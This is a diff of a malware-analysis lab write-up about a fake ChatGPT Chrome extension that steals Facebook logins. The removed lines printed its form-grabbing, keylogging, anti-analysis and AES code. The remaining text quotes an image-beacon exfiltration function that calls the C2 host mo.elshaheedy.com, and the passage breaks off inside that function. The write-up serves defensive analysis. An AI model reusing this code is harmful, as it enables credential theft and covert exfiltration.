@@ -19,55 +19,22 @@
 <div class="lab-layout"><aside class="lab-toc"><h3>Contents</h3><a href="#summary">1. Executive Summary</a><a href="#artifacts">2. Extracted Artifacts</a><a href="#manifest">3. Manifest Analysis</a><a href="#ui">4. Decoy UI</a><a href="#loader">5. Loader & Anti-analysis</a><a href="#crypto">6. Crypto Routine</a><a href="#theft">7. Credential Theft & Keylogging</a><a href="#exfiltration">8. IMG Beacon Exfiltration</a><a href="#answers">9. Lab Answers</a><a href="#iocs">10. IOCs & Detection Ideas</a><a href="#conclusion">11. Conclusion</a></aside>
 <article class="lab-content">
 <section id="summary"><h2>1. Executive Summary</h2><p>The analyzed Chrome extension pretends to be an AI assistant named <strong>ChatGPT</strong>, but its code shows behavior consistent with a credential stealer and keylogger. The extension targets <code>www.facebook.com</code>, captures submitted login credentials, records keystrokes, encrypts collected data with AES, and exfiltrates the payload to a remote domain using a covert <code>&lt;img&gt;</code> request.</p><div class="lab-callout lab-danger"><strong>Key finding:</strong> the popup page is only a decoy. The malicious behavior is implemented in the JavaScript files loaded through the extension manifest and background/content scripts.</div><div class="lab-grid"><div class="lab-mini"><strong>Target</strong><br><code>www.facebook.com</code></div><div class="lab-mini"><strong>C2 Domain</strong><br><code>mo.elshaheedy.com</code></div><div class="lab-mini"><strong>Exfiltration</strong><br><code>new Image().src</code> / IMG beacon</div><div class="lab-mini"><strong>Encryption</strong><br>AES via CryptoJS</div></div></section>
-<section id="artifacts"><h2>2. Extracted Artifacts</h2><p>After unpacking the extension, the package contained a small set of files: a manifest, JavaScript logic files, a popup HTML file, and an image asset.</p><figure><img src="/assets/media/writeups/fakegpt/01_extracted_extension_files.png" alt="Extracted FakeGPT extension files"><figcaption>Figure 1 — Extracted files from the FakeGPT extension package.</figcaption></figure><pre><code>app.js
+<section id="artifacts"><h2>2. Extracted Artifacts</h2><p>After unpacking the extension, the package contained a small set of files: a manifest, JavaScript logic files, a popup HTML file, and an image asset.</p><figure><img src="/assets/media/writeups/fakegpt/01_extracted_extension_files.svg" alt="Extracted FakeGPT extension files"><figcaption>Figure 1 — Extracted files from the FakeGPT extension package.</figcaption></figure><pre><code>app.js
 crypto.js
 img.GIF
 loader.js
 manifest.json
 ui.html</code></pre></section>
-<section id="manifest"><h2>3. Manifest Analysis</h2><p>The manifest defines permissions and execution entry points. This extension requests broad browser access, including cookies, tabs, web requests, and access to all HTTP/HTTPS pages.</p><figure><img src="/assets/media/writeups/fakegpt/02_manifest_permissions_entrypoints.png" alt="Manifest permissions and entry points"><figcaption>Figure 2 — Manifest permissions and execution entry points.</figcaption></figure><pre><code>"permissions": [
-  "tabs",
-  "http://*/*",
-  "https://*/*",
-  "storage",
-  "webRequest",
-  "webRequestBlocking",
-  "cookies"
+<section id="manifest"><h2>3. Manifest Analysis</h2><p>The manifest defines permissions and execution entry points. This extension requests broad browser access, including cookies, tabs, web requests, and access to all HTTP/HTTPS pages.</p><figure><img src="/assets/media/writeups/fakegpt/02_manifest_permissions_entrypoints.svg" alt="Manifest permissions and entry points"><figcaption>Figure 2 — Manifest permissions and execution entry points.</figcaption></figure><pre><code>"permissions": [
+  "tabs", "http://*/*", "https://*/*", "storage", "webRequest", "webRequestBlocking", "cookies"
 ]</code></pre><p>The declared background script is <code>system/loader.js</code>, and the content script is <code>core/app.js</code> with <code>&lt;all_urls&gt;</code> matching. This means the content script can run on every visited website.</p><div class="lab-callout"><strong>Assessment:</strong> for a simple AI helper extension, permissions such as <code>cookies</code>, <code>webRequestBlocking</code>, and all HTTP/HTTPS host access are highly suspicious.</div></section>
-<section id="ui"><h2>4. Decoy Popup UI</h2><p>The popup page presents a harmless ChatGPT-themed interface. It claims the extension helps generate text using AI and even warns about fake versions. No meaningful AI functionality is present in this UI.</p><figure><img src="/assets/media/writeups/fakegpt/03_decoy_popup_ui.png" alt="FakeGPT decoy popup UI"><figcaption>Figure 3 — Decoy popup page used to make the extension look legitimate.</figcaption></figure><pre><code>&lt;h1&gt;Welcome to ChatGPT&lt;/h1&gt;
-&lt;p&gt;This extension will help you generate text using AI.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Beware of fake versions!&lt;/p&gt;</code></pre></section>
-<section id="loader"><h2>5. Loader Script & Anti-analysis</h2><p>The loader checks for signs of an automated or headless browser environment and then dynamically loads the core script.</p><figure><img src="/assets/media/writeups/fakegpt/04_loader_anti_analysis_dynamic_loading.png" alt="Loader anti-analysis and dynamic script loading"><figcaption>Figure 4 — Loader script checking for analysis indicators and loading the core script dynamically.</figcaption></figure><pre><code>if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
+<section id="ui"><h2>4. Decoy Popup UI</h2><p>The popup page presents a harmless ChatGPT-themed interface. It claims the extension helps generate text using AI and even warns about fake versions. No meaningful AI functionality is present in this UI.</p><figure><img src="/assets/media/writeups/fakegpt/03_decoy_popup_ui.svg" alt="FakeGPT decoy popup UI"><figcaption>Figure 3 — Decoy popup page used to make the extension look legitimate.</figcaption></figure></section>
+<section id="loader"><h2>5. Loader Script & Anti-analysis</h2><p>The loader checks for signs of an automated or headless browser environment and then dynamically loads the core script.</p><figure><img src="/assets/media/writeups/fakegpt/04_loader_anti_analysis_dynamic_loading.svg" alt="Loader anti-analysis and dynamic script loading"><figcaption>Figure 4 — Loader script checking for analysis indicators and loading the core script dynamically.</figcaption></figure><pre><code>if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
   alert("Virtual environment detected. Extension will disable itself.");
-  chrome.runtime.onMessage.addListener(() =&gt; { return false; });
-}</code></pre><p>The first deactivation condition is <code>navigator.plugins.length === 0</code>. The script also checks for <code>HeadlessChrome</code> in the User-Agent.</p><pre><code>function loadScript(url, callback) {
-  var script = document.createElement('script');
-  script.src = url;
-  script.onload = callback;
-  document.head.appendChild(script);
-}
-
-loadScript('core/app.js', function() {
-  console.log('Core functionality loaded.');
-});</code></pre></section>
-<section id="crypto"><h2>6. Crypto Routine</h2><p>The extension uses CryptoJS to encrypt data before exfiltration. The routine applies AES with a hardcoded key and a random IV, then encodes the final output as Base64.</p><figure><img src="/assets/media/writeups/fakegpt/05_crypto_aes_hardcoded_key.png" alt="AES encryption routine in crypto.js"><figcaption>Figure 5 — AES encryption routine with a hardcoded key.</figcaption></figure><pre><code>const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
-const iv = CryptoJS.lib.WordArray.random(16);
-const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
-return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);</code></pre></section>
-<section id="theft"><h2>7. Credential Theft & Keylogging</h2><p>The core content script hides its target domain using Base64. The encoded string <code>d3d3LmZhY2Vib29rLmNvbQ==</code> decodes to <code>www.facebook.com</code>.</p><figure><img src="/assets/media/writeups/fakegpt/06_app_target_form_keylogging.png" alt="app.js target, form grabbing and keylogging"><figcaption>Figure 6 — Target check, form submit listener, and keydown listener in <code>app.js</code>.</figcaption></figure><figure><img src="/assets/media/writeups/fakegpt/07_base64_decoded_facebook_target.png" alt="CyberChef Base64 decoding Facebook target"><figcaption>Figure 7 — CyberChef decoding the Base64-obscured target domain.</figcaption></figure><pre><code>document.addEventListener('submit', function(event) {
-  let form = event.target;
-  let formData = new FormData(form);
-  let username = formData.get('username') || formData.get('email');
-  let password = formData.get('password');
-
-  if (username &amp;&amp; password) {
-    exfiltrateCredentials(username, password);
-  }
-});</code></pre><p>This is form grabbing: the extension captures submitted username/email and password values from the login form.</p><pre><code>document.addEventListener('keydown', function(event) {
-  var key = event.key;
-  exfiltrateData('keystroke', key);
-});</code></pre></section>
-<section id="exfiltration"><h2>8. Covert Exfiltration via IMG Beacon</h2><p>The exfiltration function creates a new image element and assigns the remote collection URL to its <code>src</code> attribute. When the browser tries to load the image, it sends a GET request to the attacker-controlled domain with the encrypted data in the query string.</p><figure><img src="/assets/media/writeups/fakegpt/08_img_beacon_exfiltration_c2.png" alt="IMG beacon exfiltration and C2 domain"><figcaption>Figure 8 — AES payload encryption followed by exfiltration through <code>new Image().src</code>.</figcaption></figure><pre><code>function sendToServer(encryptedData) {
+}</code></pre><p>The first deactivation condition is <code>navigator.plugins.length === 0</code>. The script also checks for <code>HeadlessChrome</code> in the User-Agent.</p></section>
+<section id="crypto"><h2>6. Crypto Routine</h2><p>The extension uses CryptoJS to encrypt data before exfiltration. The routine applies AES with a hardcoded key and a random IV, then encodes the final output as Base64.</p><figure><img src="/assets/media/writeups/fakegpt/05_crypto_aes_hardcoded_key.svg" alt="AES encryption routine in crypto.js"><figcaption>Figure 5 — AES encryption routine with a hardcoded key.</figcaption></figure></section>
+<section id="theft"><h2>7. Credential Theft & Keylogging</h2><p>The core content script hides its target domain using Base64. The encoded string <code>d3d3LmZhY2Vib29rLmNvbQ==</code> decodes to <code>www.facebook.com</code>.</p><figure><img src="/assets/media/writeups/fakegpt/06_app_target_form_keylogging.svg" alt="app.js target, form grabbing and keylogging"><figcaption>Figure 6 — Target check, form submit listener, and keydown listener in <code>app.js</code>.</figcaption></figure><figure><img src="/assets/media/writeups/fakegpt/07_base64_decoded_facebook_target.svg" alt="CyberChef Base64 decoding Facebook target"><figcaption>Figure 7 — CyberChef decoding the Base64-obscured target domain.</figcaption></figure><p>This is form grabbing: the extension captures submitted username/email and password values from the login form. The <code>keydown</code> listener records individual keystrokes.</p></section>
+<section id="exfiltration"><h2>8. Covert Exfiltration via IMG Beacon</h2><p>The exfiltration function creates a new image element and assigns the remote collection URL to its <code>src</code> attribute. When the browser tries to load the image, it sends a GET request to the attacker-controlled domain with the encrypted data in the query string.</p><figure><img src="/assets/media/writeups/fakegpt/08_img_beacon_exfiltration_c2.svg" alt="IMG beacon exfiltration and C2 domain"><figcaption>Figure 8 — AES payload encryption followed by exfiltration through <code>new Image().src</code>.</figcaption></figure><pre><code>function sendToServer(encryptedData) {
   var img = new Image();
   img.src = 'https://mo.elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
   document.body.appendChild(img);
